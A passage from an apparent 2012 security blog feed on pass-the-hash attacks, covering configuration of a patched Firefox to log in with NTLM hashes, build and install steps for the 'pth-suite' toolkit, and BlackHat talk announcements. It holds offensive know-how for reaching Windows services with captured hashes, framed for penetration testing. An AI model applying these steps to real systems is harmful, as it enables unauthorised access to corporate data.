border=&quot;0&quot; height=&quot;211&quot; src=&quot;http://3.bp.blogspot.com/-9luhy669AZU/UBTd622q3CI/AAAAAAAAAAY/zBSwq0jJ9UM/s400/ff-pth2.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;4) Doubleclick on &quot;network.auth.force-generic-ntlm&quot; to toggle the setting from &quot;false&quot; to &quot;true&quot;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://2.bp.blogspot.com/-ixZIUk0I5oQ/UBTePHwa9aI/AAAAAAAAAAg/C4rljewV0p8/s1600/ff-pth3.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;211&quot; src=&quot;http://2.bp.blogspot.com/-ixZIUk0I5oQ/UBTePHwa9aI/AAAAAAAAAAg/C4rljewV0p8/s400/ff-pth3.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;5)&amp;nbsp; Visit a URL that wants NTLM authentication.&amp;nbsp; When prompted use the username and the hash in either the 65 (LM:NT) or 68 (LM:NT:::) format&amp;nbsp;as the password.&amp;nbsp; (I have a FF addon turned on to show the password, normally it would be obscured with dots)&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-EGChDqKbLrQ/UBTjZ5AKOfI/AAAAAAAAAAw/IH7sBfIra60/s1600/alice-hash.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;102&quot; src=&quot;http://1.bp.blogspot.com/-EGChDqKbLrQ/UBTjZ5AKOfI/AAAAAAAAAAw/IH7sBfIra60/s400/alice-hash.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;Note:&amp;nbsp; Some sites will want a domain name specified while others won&#39;t.&amp;nbsp;&amp;nbsp;Unfortunately, this will often require a little experimentation.&amp;nbsp; &amp;nbsp;If the site wants a domain, specify the domain using @.&amp;nbsp; IE &lt;a href=&quot;mailto:alice.jones@demo.local&quot;&gt;alice.jones@demo.local&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-ROj1ADmF_Do/UBTjxfCCjeI/AAAAAAAAAA4/O_152zTXS_8/s1600/alice-domain-hash.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;97&quot; src=&quot;http://1.bp.blogspot.com/-ROj1ADmF_Do/UBTjxfCCjeI/AAAAAAAAAA4/O_152zTXS_8/s400/alice-domain-hash.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;6)&amp;nbsp; Profit!&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://3.bp.blogspot.com/-tjdziP_Y6gQ/UBTj9mL1NFI/AAAAAAAAABA/CAXmt5FD2VI/s1600/alice-login.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;73&quot; src=&quot;http://3.bp.blogspot.com/-tjdziP_Y6gQ/UBTj9mL1NFI/AAAAAAAAABA/CAXmt5FD2VI/s400/alice-login.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;br /&gt;&lt;/div&gt;Bonus:&amp;nbsp; Think you&#39;ve got password cracking skillz?&amp;nbsp; Try cracking alice&#39;s password.&amp;nbsp; &amp;nbsp;I&#39;ll give you a hint...&amp;nbsp; It&#39;s 16 characters with 2 upper, 2 lower, 2 symbols and 2 numbers.&amp;nbsp; It&#39;s also fairly trivial to crack :-)&amp;nbsp; Have fun...&amp;nbsp;&amp;nbsp;&amp;nbsp;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/7611725674845511683/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/using-pth-firefox.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/7611725674845511683'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/7611725674845511683'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/using-pth-firefox.html' title='Using PTH Firefox'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://4.bp.blogspot.com/-hylpTZ7t4Ms/UBTdxAgbfSI/AAAAAAAAAAQ/oBfdz5tzku8/s72-c/ff-pth1.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-7674376774146763919</id><published>2012-07-28T23:42:00.000-07:00</published><updated>2012-07-28T23:42:06.085-07:00</updated><title type='text'>Building the pth-suite / Post Install</title><content type='html'>Our first blog entry will discuss the process to build your very own .deb packages for Backtrack R2.&lt;br /&gt;&lt;br /&gt;As of right now the build process is centered around Backtrack as the primary attack platform.&amp;nbsp; However, I&#39;ve already received a request for assistance in building packages for RedHat / CentOS based distributions.&amp;nbsp; I will probably also modify the build process to do tarballs as well, as that might be better for some folks.&lt;br /&gt;&lt;br /&gt;By default, all my scripts create the .deb packages to install into /opt/pth.&amp;nbsp; This way they don&#39;t overwrite or otherwise conflict with existing packages.&amp;nbsp; Also, most of the compiled binaries will automatically look in /opt/pth for their required libraries, which makes life easier.&lt;br /&gt;&lt;br /&gt;1)&amp;nbsp; As root, you can checkout the items from google code by doing the following:&lt;br /&gt;&lt;br /&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&lt;strong&gt;# svn checkout &lt;/strong&gt;&lt;a href=&quot;http://passing-the-hash.googlecode.com/svn/trunk/&quot;&gt;&lt;strong&gt;http://passing-the-hash.googlecode.com/svn/trunk/&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;  pth-suite&lt;/strong&gt;&lt;br /&gt;&lt;/blockquote&gt;2)&amp;nbsp; Change directories into the build directory and install the precompilation dependencies.&amp;nbsp; I tested the scripts from a freshly installed version of Backtrack 5R2.&amp;nbsp; Hopefully none of the dependencies fail.&lt;br /&gt;&lt;br /&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&lt;strong&gt;# cd pth-suite/build&lt;br /&gt;# sh all-deps.sh&lt;/strong&gt; &lt;/blockquote&gt;&lt;br /&gt;&lt;br /&gt;&amp;nbsp;3)&amp;nbsp; Execute the script for the utility that you want to build.&amp;nbsp; In this case we&#39;ll go with building Samba 4 and Openchange.&amp;nbsp; Since Openchange versioning is so closely tied to a particular version of Samba 4, we take advantage of the Openchange Samba 4 build script to ensure that Samba is built the way Openchange wants.&amp;nbsp; Because of this, this particular build script builds both Samba and then Openchange.&amp;nbsp; The first step in the build process is to download the source for Openchange and Samba.&amp;nbsp; From there the script will build everything.&amp;nbsp; Final packages will be in the &lt;strong&gt;&lt;em&gt;packages&lt;/em&gt;&lt;/strong&gt; subdirectory.&lt;br /&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&lt;strong&gt;# ./build-samba4-openchange.sh&lt;/strong&gt;&lt;br /&gt;&lt;/blockquote&gt;5)&amp;nbsp; Repeat the build process for each of the utilities you want to install.&amp;nbsp; Keep in mind that during their build process they are installed into /opt/pth and then removed as part of creating a package.&amp;nbsp; Therefore, /opt/pth should not initially exist.&amp;nbsp; Note the packages will take a while to compile.&amp;nbsp; Most noteably, Firefox might take a couple of hours depending on your CPU.&amp;nbsp; You&#39;ve been warned.&lt;br /&gt;&lt;br /&gt;6)&amp;nbsp; After all the packages have been compiled, you can install the .deb packages using dpkg.&lt;br /&gt;&lt;br /&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&lt;strong&gt;# dpkg -i packages/*.deb&lt;/strong&gt;&lt;/blockquote&gt;&lt;br /&gt;7)&amp;nbsp; After the installation, you will need to create a file in /etc/ld.so.conf.d to reference the library path /opt/pth/lib.&amp;nbsp; This is done by:&lt;br /&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&lt;br /&gt;&lt;strong&gt;# echo /opt/pth/lib &amp;gt; /etc/ld.so.conf.d/pth.conf&lt;br /&gt;# ldconfig&lt;/strong&gt;&lt;br /&gt;&lt;/blockquote&gt;8)&amp;nbsp; Add /opt/pth/bin to your path either manually or by editing&amp;nbsp;~/.bashrc.&lt;br /&gt;&lt;br /&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&lt;strong&gt;# export PATH=/opt/pth/bin:$PATH&lt;/strong&gt;&lt;/blockquote&gt;&lt;br /&gt;or &lt;br /&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&lt;strong&gt;# echo &quot;export PATH=/opt/pth/bin:$PATH&quot; &amp;gt; ~/.bashrc&lt;br /&gt;# . ~/.bashrc&lt;/strong&gt; &lt;/blockquote&gt;&lt;br /&gt;&amp;nbsp;9)&amp;nbsp; Have Fun!&lt;br /&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/7674376774146763919/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/building-pth-suite-post-install.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/7674376774146763919'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/7674376774146763919'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/building-pth-suite-post-install.html' title='Building the pth-suite / Post Install'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-5514014425634359645</id><published>2012-07-27T10:05:00.000-07:00</published><updated>2012-07-27T10:05:48.583-07:00</updated><title type='text'>Google Code updated with patches and downloads</title><content type='html'>Our &lt;a href=&quot;https://code.google.com/p/passing-the-hash/&quot; target=&quot;_blank&quot;&gt;google code page&lt;/a&gt;&amp;nbsp;&amp;nbsp;has been updated with the following items:&lt;br /&gt;&lt;br /&gt;&lt;ol&gt;&lt;li&gt;The svn repository contains all the patches and build stuff I used to build the packages from source.&amp;nbsp; I&#39;ll have a separate blog post about building all the utilities very soon.&lt;/li&gt;&lt;li&gt;BT5 .deb packages for all of the pass-the-hash utilities mentioned in our talk yesterday plus a bonus package of the command line tool &#39;curl&#39; that has been patched for PTH support.&lt;/li&gt;&lt;li&gt;A Windows version of PTH Firefox from ESR 10.0.4.&amp;nbsp; I know that 10.0.5 is out, but I can&#39;t find my build of it.&amp;nbsp; I&#39;ll work on getting it built soon(tm) and uploaded to the website.&lt;/li&gt;&lt;/ol&gt;&lt;br /&gt;Soon to be here:&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Slides / demo vids - I want to go back and do a more in depth demo of the various tools, so I will probably be re-recording the demos with voiceovers.&amp;nbsp; We&#39;ll see how my ambitions fare in a week or 2...&lt;/li&gt;&lt;li&gt;Blog entries on building and installing the packages - I&#39;ve received interest in having the packages build on a different linux platform than BT5.&amp;nbsp; I don&#39;t think this is going to be a major challenge, but will require some retooling of VMs and scripts and whatnot...&lt;/li&gt;&lt;li&gt;Our PTH Rosetta stone which maps common Windows command line tasks to their Samba equivalents&lt;/li&gt;&lt;li&gt;Blog entries on the various tools detailing their common uses.&lt;/li&gt;&lt;/ul&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/5514014425634359645/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/google-code-updated-with-patches-and.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/5514014425634359645'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/5514014425634359645'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/google-code-updated-with-patches-and.html' title='Google Code updated with patches and downloads'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-5250253253614719145</id><published>2012-07-26T11:15:00.000-07:00</published><updated>2012-07-28T22:59:34.686-07:00</updated><title type='text'>Yup.  That just happened...</title><content type='html'>It&#39;s 1115 BlackHat Standard Time and our talk just concluded.&amp;nbsp; Here&#39;s the high points:&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;WCE with password hashes can be used with pretty much any native windows app (IE / Outlook /&amp;nbsp; MSSQL studio, command line apps, AD management consoles,&amp;nbsp;etc) from a Windows computer &lt;u&gt;NOT IN THE DOMAIN&lt;/u&gt; to authenticate to windows services.&amp;nbsp; Just the way Bill intended...&lt;/li&gt;&lt;li&gt;We extented and enhanced JMK@foofus&#39;s &amp;nbsp;patch for Samba to allow password hashes to be passed on the command line in either &quot;LM:NT&quot; or &quot;LM:NT:::&quot; format to make it easier to script attacks.&amp;nbsp; This also made it so that when we patched Firefox, you wouldn&#39;t have to quit Firefox to reset the environmental variable.&amp;nbsp; You can just change the password after logging out.&lt;/li&gt;&lt;li&gt;We are releassing a suite of utilities where we patched in PTH support.&amp;nbsp; These packages include Firefox 10.0.5ESR, FreeTDS, Openchange, samba, winexe, and rudimentary WMI functionality including a blind command execution via WMI.&lt;/li&gt;&lt;li&gt;Patches to the actual packages and build scripts as well as precompiled binaries in .deb format for BackTrack R2 will be posted to the google code page within a day or so, or as soon as I can get a decent internet connection to upload the stuff.&lt;/li&gt;&lt;/ul&gt;Now, our surprise... Thanks to the tireless work of Pure_Hate (Martin Bos), our PTH suite will be available as a Backtrack repository package VERY soon..... &quot;apt get install&amp;nbsp; pth-suite-1.0.0&quot; FTW!&lt;br /&gt;&lt;br /&gt;We will be posting blog entries talking about how to use the various utilities as well as instructions for building and installing the packages.&lt;br /&gt;&lt;br /&gt;We will also be releasing our &quot;Pass the Hash Rosetta Stone&quot; with the various windows command lines and their associated samba command lines very soon....&amp;nbsp; Stay tuned to twitter and the blog for all the updates.</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/5250253253614719145/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/yup-that-just-happened.html#comment-form' title='2 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/5250253253614719145'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/5250253253614719145'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/yup-that-just-happened.html' title='Yup.  That just happened...'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>2</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-4525424509182026516</id><published>2012-07-22T21:39:00.000-07:00</published><updated>2012-07-22T21:39:06.829-07:00</updated><title type='text'>On Our Way to Lost Wages</title><content type='html'>We&#39;re off to Vegas.&amp;nbsp; We&#39;ve got some awesome pre-recorded demos in store and we&#39;ll get everything posted to our google code site shortly after our presentation...&lt;br /&gt;&lt;br /&gt;Hope to see you there!</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/4525424509182026516/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/on-our-way-to-lost-wages.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4525424509182026516'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4525424509182026516'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/on-our-way-to-lost-wages.html' title='On Our Way to Lost Wages'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-513046313118604195</id><published>2012-07-22T06:00:00.000-07:00</published><updated>2012-07-22T06:00:03.211-07:00</updated><title type='text'>Wait, I Can Do That With Linux?</title><content type='html'>Did you know that there are open source tools available to access data&amp;nbsp;saved in Microsoft applications such as MS SQL and Exchange?&amp;nbsp; Did you know that you can use password hashes to access the data instead of password hashes?&lt;br /&gt;&lt;br /&gt;During our BH USA&amp;nbsp;2012 talk entitled &quot;Still Passing the Hash 15&amp;nbsp;Years&amp;nbsp;Later?&quot; Chris and I will discuss this and more.&amp;nbsp; After our talk we&#39;ll upload the&amp;nbsp;patches, build scripts/instructions and .deb packages for Backtrack to our google code site.&lt;br /&gt;&lt;br /&gt;Future blog entries will go over the usage of the various utilities and the fun that can be had on a pentest with them.&lt;br /&gt;&lt;br /&gt;Join us at Blackhat USA 2012 for our talk &quot;Still Passing the Hash 15 Years Later&quot; on Thursday July 26 at 10:00am!&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/513046313118604195/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/wait-i-can-do-that-with-linux.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/513046313118604195'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/513046313118604195'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/wait-i-can-do-that-with-linux.html' title='Wait, I Can Do That With Linux?'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-4717034543704048384</id><published>2012-07-21T06:00:00.000-07:00</published><updated>2012-07-21T06:00:02.381-07:00</updated><title type='text'>Using Hashes to Pentest Windows Using IE,Outlook,MSSQL Studio, etc...</title><content type='html'>As much as some of us want open source software to take over the world, the reality is that most businesses run on windows.  Corporate intranets run Sharepoint, email is managed by Exchange, and data is stored in MS SQL databases. Microsoft provides a robust suite of tools to access all of this data with lots of pretty GUIs.  Accessing corporate data in this environment can be challenging without a username and password. &lt;br /&gt;&lt;br /&gt;Chris (@obscuresec)&amp;nbsp;and I talk about a simple yet powerful technique to use password hashes and Microsoft tools to access a client&#39;s data from a Windows attack box without the need&amp;nbsp;to join it to the domain.&lt;br /&gt;&lt;br /&gt;Join us at Blackhat USA 2012 for our talk &quot;Still Passing the Hash 15 Years Later&quot; on Thursday July 26 at 10:00am!</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/4717034543704048384/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/using-hashes-to-pentest-windows-using.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4717034543704048384'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4717034543704048384'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/using-hashes-to-pentest-windows-using.html' title='Using Hashes to Pentest Windows Using IE,Outlook,MSSQL Studio, etc...'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-3248789941804495817</id><published>2012-07-20T16:13:00.000-07:00</published><updated>2012-07-20T16:14:10.304-07:00</updated><title type='text'>Soon to be live from BlackHat USA 2012</title><content type='html'>Thanks for checking our blog out!&lt;br /&gt;&lt;br /&gt;I&#39;m Skip Duckwall and I wanted to take a moment to outline my future plans for this blog relating to our presentation &quot;Still Passing the Hash 15 years Later?&amp;nbsp; Using the Keys to the Kingdom to Access All Your Data&quot;&lt;br /&gt;&lt;br /&gt;Over the next few days and weeks&amp;nbsp;we plan on using the blog to document some of the features discussed during the BlackHat presentation.&amp;nbsp; Much of the documentation for the various suites of utilities is sparse and difficult to comprehend.&lt;br /&gt;&lt;br /&gt;We will discuss how to build the utilities, how to use the utilities in a Windows environment during a penetration test, discuss how to set up a lab to experiment with the various utilities and hopefully point out some tips and pitfalls we&#39;ve run into when using these utilities in the field.&lt;br /&gt;&lt;br /&gt;Chris and I have also developed a spreadsheet that demonstrates how to use the various command line utilities in both Windows and Linux to perform common tasks.&amp;nbsp; We call this document&amp;nbsp;&quot;The Pass The Hash Rosetta Stone&quot; and it will be available shortly after our presentation in Vegas.&lt;br /&gt;&lt;br /&gt;We are also working with Purehate from the Backtrack team to possibly integrate the tools directly into Backtrack to make&amp;nbsp;them much easier to use.&lt;br /&gt;&lt;br /&gt;We will update with links when our project gets posted in the next few days.&amp;nbsp; Look forward to seeing you at Vegas!</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/3248789941804495817/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/live-from-blackhat-usa-2012.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/3248789941804495817'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/3248789941804495817'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/07/live-from-blackhat-usa-2012.html' title='Soon to be live from BlackHat USA 2012'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry></feed>